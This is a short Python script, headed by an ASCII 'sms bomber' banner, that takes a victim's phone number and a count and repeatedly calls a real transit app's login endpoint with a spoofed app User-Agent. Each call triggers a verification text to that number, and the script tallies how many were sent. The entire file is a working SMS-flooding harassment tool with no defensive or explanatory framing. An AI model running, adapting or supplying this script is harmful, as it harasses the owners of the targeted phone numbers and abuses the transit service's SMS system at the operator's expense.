import requests
print("""
     _.-^^---....,,----       
 _--        sms        --__  
<          bomber         >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
""")
headers = ({'User-Agent':
        'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
phoneNumber = input("Enter phone number: ")
phoneNumber = str(phoneNumber)
url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
numofmsgs = int(input("Enter number of messages to send: "))
successspamCount = 0
failspamCount = 0
for i in range(numofmsgs):
    resp = requests.get(url)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total successful messages sent: ",  successspamCount)
print("Total failed messages sent: ", failspamCount)
